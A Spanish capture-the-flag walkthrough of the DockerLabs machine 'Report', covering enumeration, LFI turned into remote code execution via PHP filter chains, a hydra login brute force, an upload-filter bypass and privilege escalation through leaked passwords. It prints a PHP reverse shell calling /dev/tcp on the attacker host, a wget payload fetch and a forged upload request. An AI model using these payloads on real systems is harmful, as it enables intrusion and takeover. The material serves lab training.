#MAQUINA #DOCKERLABS #MEDIO
#LFI #PHP_WRAPPERS #RCE 
#ABUSO_SUBIDA_ARCHIVOS 
<hr>

# RECONOCIMIENTO

Vamos a resolver **Report** de la plataforma **DockerLabs**.

   ```bash

Máquina desplegada, su dirección IP es --> 172.17.0.2

```

Primero vamos a hacer un escaneo de puertos rápido:

```bash

nmap -sS --min-rate 5000 -vvv -n -Pn -p- 172.17.0.2 --open
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:13 CET
Initiating ARP Ping Scan at 15:13
Scanning 172.17.0.2 [1 port]
Completed ARP Ping Scan at 15:13, 0.04s elapsed (1 total hosts)
Initiating SYN Stealth Scan at 15:13
Scanning 172.17.0.2 [65535 ports]
Discovered open port 3306/tcp on 172.17.0.2
Discovered open port 22/tcp on 172.17.0.2
Discovered open port 80/tcp on 172.17.0.2
Completed SYN Stealth Scan at 15:13, 0.49s elapsed (65535 total ports)
Nmap scan report for 172.17.0.2
Host is up, received arp-response (0.0000030s latency).
Scanned at 2025-02-11 15:13:14 CET for 0s
Not shown: 65532 closed tcp ports (reset)
PORT     STATE SERVICE REASON
22/tcp   open  ssh     syn-ack ttl 64
80/tcp   open  http    syn-ack ttl 64
3306/tcp open  mysql   syn-ack ttl 64
MAC Address: 02:42:AC:11:00:02 (Unknown)

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 0.69 seconds
           Raw packets sent: 65536 (2.884MB) | Rcvd: 65536 (2.621MB)


```

- **`--open`**: Muestra solo los puertos abiertos en la salida.
- **`-sS`**: Especifica un escaneo TCP SYN, que es más sigiloso que un escaneo de conexión completa.
- **`--min-rate 5000`**: Establece la tasa mínima de paquetes enviados a 5000 por segundo, haciendo que el escaneo sea más rápido.
- **`-vvv`**: Aumenta el nivel de verbosidad, proporcionando una salida más detallada durante el escaneo.
- **`-n`**: No resuelve DNS; esto evita retrasos por búsquedas de nombres.
- **`-Pn`**: Trata el objetivo como si estuviera en línea; omite el descubrimiento de hosts.
- **`-p-`**: Escanea todos los 65535 puertos en lugar de solo los más comunes.

**Conclusiones:** El ttl al ser 64 nos dice que es una máquina **Linux**. Además, vemos que tiene los puertos **80(HTTP)**, **22(SSH)**, **3306(MYSQL)** abiertos.

Ahora vamos a hacer un escaneo con mayor detalle:

   ```bash

nmap -sCV -p22,80,3306 172.17.0.2                         
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:14 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.000020s latency).

PORT     STATE SERVICE VERSION
22/tcp   open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 58:46:38:70:8c:d8:4a:89:93:07:b3:43:17:81:59:f1 (ECDSA)
|_  256 25:99:39:02:52:4b:80:3f:aa:a8:9a:d4:8e:9a:eb:10 (ED25519)
80/tcp   open  http    Apache httpd 2.4.58
|_http-title: Did not follow redirect to http://realgob.dl/
|_http-server-header: Apache/2.4.58 (Ubuntu)
3306/tcp open  mysql   MySQL 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
| mysql-info: 
|   Protocol: 10
|   Version: 5.5.5-10.11.8-MariaDB-0ubuntu0.24.04.1
|   Thread ID: 9
|   Capabilities flags: 63486
|   Some Capabilities: Support41Auth, Speaks41ProtocolOld, SupportsCompression, FoundRows, DontAllowDatabaseTableColumn, SupportsTransactions, IgnoreSigpipes, LongColumnFlag, InteractiveClient, Speaks41ProtocolNew, SupportsLoadDataLocal, IgnoreSpaceBeforeParenthesis, ODBCClient, ConnectWithDatabase, SupportsMultipleStatments, SupportsMultipleResults, SupportsAuthPlugins
|   Status: Autocommit
|   Salt: I9}/lT@$3p_is(hVU*lb
|_  Auth Plugin Name: mysql_native_password
MAC Address: 02:42:AC:11:00:02 (Unknown)
Service Info: Host: 172.17.0.2; OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.49 seconds


```

```bash

nmap --script="http-enum" 172.17.0.2
Starting Nmap 7.94SVN ( https://nmap.org ) at 2025-02-11 15:15 CET
Nmap scan report for pressenter.hl (172.17.0.2)
Host is up (0.0000030s latency).
Not shown: 997 closed tcp ports (reset)
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
3306/tcp open  mysql
MAC Address: 02:42:AC:11:00:02 (Unknown)

Nmap done: 1 IP address (1 host up) scanned in 0.42 seconds

```

- **`-sC`**: Realiza un escaneo de scripts (Nmap Scripting Engine, NSE). Esto permite ejecutar scripts de `nmap` para obtener información adicional sobre los servicios detectados, como vulnerabilidades, configuraciones o detalles específicos de los mismos.
- **`-sV`**: Realiza la detección de versiones de servicios. Esto intenta identificar la versión exacta del software que está escuchando en un puerto abierto, lo que puede ayudar a determinar si hay vulnerabilidades conocidas.
- **`--script`**:  Ejecutar un script específico.

## HTTP (80)

Al revisar la web que hay en el puerto 80, vamos a utilizar **gobuster** para ver directorios interesantes:

   ```bash

gobuster dir -u http://realgob.dl/ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 20 -x html,php,js,txt,png,jpg
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://realgob.dl/
[+] Method:                  GET
[+] Threads:                 20
[+] Wordlist:                /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.6
[+] Extensions:              js,txt,png,jpg,html,php
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/.php                 (Status: 403) [Size: 275]
/about.php            (Status: 200) [Size: 4939]
/login.php            (Status: 200) [Size: 4350]
/info.php             (Status: 200) [Size: 76219]
/index.php            (Status: 200) [Size: 5048]
/uploads              (Status: 301) [Size: 310] [--> http://realgob.dl/uploads/]
/pages                (Status: 301) [Size: 308] [--> http://realgob.dl/pages/]
/.html                (Status: 403) [Size: 275]
/images               (Status: 301) [Size: 309] [--> http://realgob.dl/images/]
/admin.php            (Status: 200) [Size: 1005]
/assets               (Status: 301) [Size: 309] [--> http://realgob.dl/assets/]
/includes             (Status: 301) [Size: 311] [--> http://realgob.dl/includes/]
/database             (Status: 301) [Size: 311] [--> http://realgob.dl/database/]
/api                  (Status: 301) [Size: 306] [--> http://realgob.dl/api/]
/logout.php           (Status: 302) [Size: 0] [--> login.php]
/config.php           (Status: 200) [Size: 0]
/noticias.php         (Status: 200) [Size: 22]
/logs                 (Status: 301) [Size: 307] [--> http://realgob.dl/logs/]
/LICENSE              (Status: 200) [Size: 0]
/contacto.php         (Status: 200) [Size: 2893]
/important.txt        (Status: 200) [Size: 1818]
/registro.php         (Status: 200) [Size: 2445]
/desarrollo           (Status: 301) [Size: 313] [--> http://realgob.dl/desarrollo/]
/.php                 (Status: 403) [Size: 275]
/.html                (Status: 403) [Size: 275]
/server-status        (Status: 403) [Size: 275]
/gestion.php          (Status: 200) [Size: 0]
Progress: 1543913 / 1543920 (100.00%)
===============================================================
Finished
===============================================================


```

# EXPLOTACION 1

Al revisar el **about.php** utilizando **wfuzz** :

```bash
wfuzz -u "http://realgob.dl/about.php?FUZZ=/etc/hosts" -w /usr/share/seclists/Discovery/Web-Content/directory-list-lowercase-2.3-medium.txt  --hl=98
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://realgob.dl/about.php?FUZZ=/etc/hosts
Total requests: 207643

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                                  
=====================================================================

000000741:   200        105 L    389 W      5093 Ch     "file"                                                                                                                   

Total time: 0
Processed Requests: 207643
Filtered Requests: 207642
Requests/sec.: 0

```

Vemos que es vulnerable a un **LFI**.

El **info.php** no debería ser visible, revela mucha info sensible y mucho menos el directorio **uploads**. Vemos en el info.php que hay un **file_upload = on**.

Nos descargamos [PHP Filter Chain Generator](https://github.com/synacktiv/php_filter_chain_generator) , ya que podremos colar comandos usándola.

```bash
./php_filter_chain_generator.py   --chain  '<?php system($_GET["cmd"]);?>'

http://realgob.dl/about.php?file=<PHP CHAIN>&cmd= cd uploads; wget http://172.17.0.1:8000/wp.php

```

Tras ver que no tiene curl ( which curl ), que si tiene wget ( which wget ) y que podemos escribir en uploads ( ls -l ) y podemos verlo desde la web para que lo interprete. Nos movemos a uploads y nos bajamos una reverse shell en php, mientras nos ponemos en escucha en el puerto 443: 

   ```bash

<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

```

# EXPLOTACION 2

Al revisar el **admin.php** vemos que hay un login, intentaremos usar **hydra** para sacar la contra : 

```bash

hydra -l admin -P /usr/share/wordlists/rockyou.txt "realgob.dl" http-post-form "/admin.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=te2uqq1of7fgg0ptlnvhqeskub:F=Usuario o contraseña incorrectos." -F
Hydra v9.5 (c) 2023 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).

Hydra (https://github.com/vanhauser-thc/thc-hydra) starting at 2025-02-12 17:16:12
[WARNING] Restorefile (you have 10 seconds to abort... (use option -I to skip waiting)) from a previous session found, to prevent overwriting, ./hydra.restore
[DATA] max 16 tasks per 1 server, overall 16 tasks, 14344399 login tries (l:1/p:14344399), ~896525 tries per task
[DATA] attacking http-post-form://realgob.dl:80/admin.php:username=^USER^&password=^PASS^:H=Cookie: PHPSESSID=te2uqq1of7fgg0ptlnvhqeskub:F=Usuario o contraseña incorrectos.
[STATUS] 4695.00 tries/min, 4695 tries in 00:01h, 14339704 to do in 50:55h, 16 active
[STATUS] 4746.00 tries/min, 14238 tries in 00:03h, 14330161 to do in 50:20h, 16 active
[STATUS] 4758.43 tries/min, 33309 tries in 00:07h, 14311090 to do in 50:08h, 16 active
[STATUS] 4766.67 tries/min, 71500 tries in 00:15h, 14272899 to do in 49:55h, 16 active
[80][http-post-form] host: realgob.dl   login: admin   password: admin123
[STATUS] attack finished for realgob.dl (valid pair found)
1 of 1 target successfully completed, 1 valid password found
Hydra (https://github.com/vanhauser-thc/thc-hydra) finished at 2025-02-12 17:35:15

```

Accedemos y vemos que podemos subir archivos que se suben a **uploads**.

Vamos a subir un php que nos otorgue una reverse shell. Para ello al subir el archivo interceptamos la petición y cambiamos el content-type y los magic numbers y nos ponemos en escucha por el puerto 443 (**nc -nlvp 443**) :

   ```bash

POST /cargas.php HTTP/1.1
Host: realgob.dl
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/png,image/svg+xml,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate, br
Content-Type: multipart/form-data; boundary=---------------------------152487651215257063462338780959
Content-Length: 473
Origin: http://realgob.dl
Connection: keep-alive
Referer: http://realgob.dl/cargas.php
Cookie: PHPSESSID=te2uqq1of7fgg0ptlnvhqeskub
Upgrade-Insecure-Requests: 1
Priority: u=0, i

-----------------------------152487651215257063462338780959
Content-Disposition: form-data; name="file"; filename="wp.php"
Content-Type: image/png

PNG;
<?php

/**
* Plugin Name: test-plugin
* Plugin URI: https://www.your-site.com/
* Description: Test.
* Version: 0.1
* Author: your-name
* Author URI: https://www.your-site.com/
**/


	exec("/bin/bash -c 'bash -i > /dev/tcp/172.17.0.1/443 0>&1'");

?>

-----------------------------152487651215257063462338780959--


```


Seguro que hay muchas vulnerabilidades, pero vamos a pasar a la escalada. 
# ESCALADA PRIVILEGIOS

Tras un rato buscando y ver en /var/www/html/desarrollo un **.git**, veo a ver si hay algo que me interese :

```bash
git log
fatal: detected dubious ownership in repository at '/var/www/html/desarrollo'
To add an exception for this directory, call:

  git config --global --add safe.directory /var/www/html/desarrollo


git config --global --add safe.directory /var/www/html/desarrollo
fatal: $HOME not set
export HOME=/var/www/html/uploads
git config --global --add safe.directory /var/www/html/desarrollo
git log
```

Al principio nos da problemas, necesitamos configurar la variable HOME, en el log vemos lo siguiente:

```bash

commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management


```

Así que vamos a ver el contenido de ese commit :

```bash

www-data@8c5e1a4274a8:/var/www/html/desarrollo$ git show 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
commit 0baffeec1777f9dfe201c447dcbc37f10ce1dafa
Author: adm <adm@example.com>
Date:   Mon Oct 14 07:44:17 2024 +0000

    Acceso a Remote Management

diff --git a/remote_management_log.txt b/remote_management_log.txt
new file mode 100644
index 0000000..eafd8c6
--- /dev/null
+++ b/remote_management_log.txt
@@ -0,0 +1 @@
+Acceso a Remote Management realizado por 'adm' el Mon Oct 14 07:44:17 GMT 2024. Nueva contrase<C3><B1>a: 9fR8pLt@Q2uX7dM^sW3zE5bK8nQ@7pX

```

YA ESTAMOS COMO ADM.

Tras un buen rato, al mirar el **.bashrc** vemos que hay una variable MY_PASS y parece estar en hexadecimal:

```bash

echo '64 6f 63 6b 65 72 6c 61 62 73 34 75' | xxd -r -p

dockerlabs4u

```

**YA ESTAMOS COMO ROOT**
